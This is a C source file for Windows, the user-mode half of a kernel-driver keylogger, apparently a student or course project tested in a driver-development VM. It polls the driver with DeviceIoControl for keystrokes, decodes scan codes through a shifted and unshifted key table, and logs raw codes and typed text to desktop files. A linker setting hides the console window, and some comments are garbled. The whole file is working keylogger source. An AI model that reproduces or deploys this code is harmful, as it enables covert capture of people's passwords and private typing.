#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

#include "../Shared.h"

#define IOCTL_WAIT_FOR_KEY  CTL_CODE(FILE_DEVICE_KEYBOARD, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")


struct KeyMap {
    char normal;
    char shifted;
};

struct KeyMap keyTable[128] = { 0 };

void InitKeyTable() {
    // Rz퉐 cyfr (1-0, -, =)
    keyTable[0x02] = (struct KeyMap){ '1', '!' };
    keyTable[0x03] = (struct KeyMap){ '2', '@' };
    keyTable[0x04] = (struct KeyMap){ '3', '#' };
    keyTable[0x05] = (struct KeyMap){ '4', '$' };
    keyTable[0x06] = (struct KeyMap){ '5', '%' };
    keyTable[0x07] = (struct KeyMap){ '6', '^' };
    keyTable[0x08] = (struct KeyMap){ '7', '&' };
    keyTable[0x09] = (struct KeyMap){ '8', '*' };
    keyTable[0x0A] = (struct KeyMap){ '9', '(' };
    keyTable[0x0B] = (struct KeyMap){ '0', ')' };
    keyTable[0x0C] = (struct KeyMap){ '-', '_' };
    keyTable[0x0D] = (struct KeyMap){ '=', '+' };
    keyTable[0x0E] = (struct KeyMap){ 8, 8 };    // Backspace

    // Rz퉐 QWERTY
    keyTable[0x10] = (struct KeyMap){ 'q', 'Q' };
    keyTable[0x11] = (struct KeyMap){ 'w', 'W' };
    keyTable[0x12] = (struct KeyMap){ 'e', 'E' };
    keyTable[0x13] = (struct KeyMap){ 'r', 'R' };
    keyTable[0x14] = (struct KeyMap){ 't', 'T' };
    keyTable[0x15] = (struct KeyMap){ 'y', 'Y' };
    keyTable[0x16] = (struct KeyMap){ 'u', 'U' };
    keyTable[0x17] = (struct KeyMap){ 'i', 'I' };
    keyTable[0x18] = (struct KeyMap){ 'o', 'O' };
    keyTable[0x19] = (struct KeyMap){ 'p', 'P' };
    keyTable[0x1A] = (struct KeyMap){ '[', '{' };
    keyTable[0x1B] = (struct KeyMap){ ']', '}' };
    keyTable[0x1C] = (struct KeyMap){ '\n', '\n' };

    // Rz퉐 ASDF
    keyTable[0x1E] = (struct KeyMap){ 'a', 'A' };
    keyTable[0x1F] = (struct KeyMap){ 's', 'S' };
    keyTable[0x20] = (struct KeyMap){ 'd', 'D' };
    keyTable[0x21] = (struct KeyMap){ 'f', 'F' };
    keyTable[0x22] = (struct KeyMap){ 'g', 'G' };
    keyTable[0x23] = (struct KeyMap){ 'h', 'H' };
    keyTable[0x24] = (struct KeyMap){ 'j', 'J' };
    keyTable[0x25] = (struct KeyMap){ 'k', 'K' };
    keyTable[0x26] = (struct KeyMap){ 'l', 'L' };
    keyTable[0x27] = (struct KeyMap){ ';', ':' };
    keyTable[0x28] = (struct KeyMap){ '\'', '"' };

    // Rz퉐 ZXCV
    keyTable[0x2C] = (struct KeyMap){ 'z', 'Z' };
    keyTable[0x2D] = (struct KeyMap){ 'x', 'X' };
    keyTable[0x2E] = (struct KeyMap){ 'c', 'C' };
    keyTable[0x2F] = (struct KeyMap){ 'v', 'V' };
    keyTable[0x30] = (struct KeyMap){ 'b', 'B' };
    keyTable[0x31] = (struct KeyMap){ 'n', 'N' };
    keyTable[0x32] = (struct KeyMap){ 'm', 'M' };
    keyTable[0x33] = (struct KeyMap){ ',', '<' };
    keyTable[0x34] = (struct KeyMap){ '.', '>' };
    keyTable[0x35] = (struct KeyMap){ '/', '?' };

    keyTable[0x39] = (struct KeyMap){ ' ', ' ' };
}

bool isShifted;

void ProcessScanCode(KEY_EVENT_DATA* keyData) {
    bool isBreak = (keyData->Flags & 1);

    if (keyData->MakeCode == 0x2A || keyData->MakeCode == 0x36) {
        isShifted = !isBreak;
        return;
    }

    if (isBreak) return;

    if (keyData->MakeCode > 127) return;

    char c = isShifted ? keyTable[keyData->MakeCode].shifted : keyTable[keyData->MakeCode].normal;

    if (c != 0) {
        FILE* file = fopen("C:\\Users\\WDKRemoteUser\\Desktop\\OS_keyloggerText.txt", "a");

        if (file) {
            fprintf(file, "%c", c);
            fclose(file);
        }
        else
        {
            DWORD error = GetLastError();
            printf("Could not open a file\n error: %lu\n", error);
        }
    }
}

int main() {
	HANDLE hDevice;
	DWORD bytesReturned;
	KEY_EVENT_DATA buffer;

	hDevice = CreateFile(L"\\\\.\\OS_keyloggerLink", GENERIC_READ , FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		DWORD error = GetLastError();
		printf("could not connect to the driver\nerror = %lu\n", error);
		getchar();
		return 1;
	}
    InitKeyTable(keyTable);

	BOOL status;
	while (1) {
		printf("request sent\n");
		status = DeviceIoControl(hDevice, IOCTL_WAIT_FOR_KEY, NULL, 0, &buffer, sizeof(KEY_EVENT_DATA), &bytesReturned, NULL);
		
		if (status) {
			printf("key recieved\n");
			FILE* file = fopen("C:\\Users\\WDKRemoteUser\\Desktop\\OS_keylogger.txt", "a");

			if (file) {
				fprintf(file, "0x%hx 0x%hx\n", buffer.MakeCode, buffer.Flags);
				fclose(file);
				printf("saved key\n");
			}
			else
			{
				DWORD error = GetLastError();
				printf("Could not open a file\n error: %lu\n", error);
			}

            ProcessScanCode(&buffer);
		}
		else {
			DWORD error = GetLastError();
			printf("DeviceIoControl failed\n error: %lu\n", error);
			Sleep(1000);
		}
	}

	CloseHandle(hDevice);

	return 0;
}